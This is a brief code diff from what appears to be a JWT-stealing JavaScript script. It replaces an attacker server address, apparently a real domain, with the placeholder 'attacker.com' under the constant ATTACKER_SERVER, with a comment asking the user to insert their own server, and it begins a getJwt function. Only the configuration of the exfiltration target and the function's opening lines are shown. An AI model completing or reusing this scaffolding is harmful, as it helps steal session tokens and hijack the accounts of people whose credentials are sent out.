@@ -1,4 +1,4 @@
-const ATTACKER_SERVER = "https://matinarjo.ir"; // Write your server address here
+const ATTACKER_SERVER = "https://attacker.com"; // Write your server address here
 
 const getJwt = function () {
   return new Promise((resolve) => {
